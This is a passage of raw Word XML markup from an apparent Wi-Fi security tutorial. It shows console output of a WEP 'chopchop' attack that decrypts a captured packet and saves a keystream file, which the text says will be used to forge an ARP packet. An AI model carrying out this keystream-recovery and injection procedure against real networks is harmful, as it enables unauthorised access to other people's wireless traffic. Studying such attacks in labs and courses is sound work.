        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">. MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  FF:FF:FF:FF:FF:FF</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0F8B80A7"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Source MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:40:F4:77:E5:C9</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="75D3368B"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E07552"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0x0000:  0842 0000 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ffff</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0014 6c7e 4080  .B..........l~@.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3801AA53"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0x0010:  0040 f477 e5c9 603a d600 0000 5fed </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>a222  .@.w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>..`</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_.."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32EFFC55"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0x0020:  e2ee aa48 8312 f59d c8c0 af5f 3dd8 a543  ...H</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.......</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_=..C</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB01BFA"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0x0030:  d1ca 0c9b 6aeb fad6 f394 2591 5bf4 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>2873  ....</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>j.....%.[.(s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2E0A27"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0x0040:  16d4 43fb </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>aebb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3ea1 7101 729e 65ca </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>6905  ..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>C...&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>q.r.e.i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77486D2E"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0x0050:  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>cfeb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4a72 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>be46                           ..</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Jr.F</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="30917705"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p>
    <w:p w14:paraId="578FD7A7"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Use this </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>packet ?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="4450FD88" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="0038547B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>You respond “y” above and the system continues.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721B1867"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Saving chosen packet in replay_src-0201-191639.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14842AFF"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D722A9E"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Offset   85 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>( 0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">% done) | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = D3 | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 95 |  253 frames written in   760ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DD62587" w14:textId="4DB70B63" w:rsidR="00204ED2" w:rsidRPr="0038547B" w:rsidRDefault="004652D1" w:rsidP="00204ED2">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Offset   46 (75% done) | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 51 | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = F4 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>|  253</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> frames </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FF12A6" w14:textId="03A6045C"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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>written</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> in   695ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7B5453"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Offset   36 (94% done) | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 83 | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 00 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>|   19</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> frames written in    58ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455EF52E"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Offset   35 (96% done) | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 4E | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>pt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 06 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>|  230</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> frames written in   689ms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F0B775"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Sent 957 packets, current guess: B9...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BBAE3DD"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC45F65"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The AP appears to drop packets shorter than 35 bytes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078C4B76"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Enabling standard workaround: ARP header re-creation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C378FF6"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9A9CA4"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Saving plaintext in replay_dec-0201-191706.cap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48783C55" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="0038547B"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38547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Saving </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>keystream</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0038547B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> in replay_dec-0201-191706.xor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47AF7347" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E641F0" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Completed in 21s (2.29 bytes/s)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7C512F" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00204ED2" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Success! The file “replay_dec-0201-191706.xor” above can then be used in the next step to generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00204ED2">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="117380C9" w14:textId="77777777" w:rsidR="00EA0EF7" w:rsidRDefault="00EA0EF7" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68B0C453" w14:textId="40FD9603" w:rsidR="004652D1" w:rsidRDefault="00590FC4" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
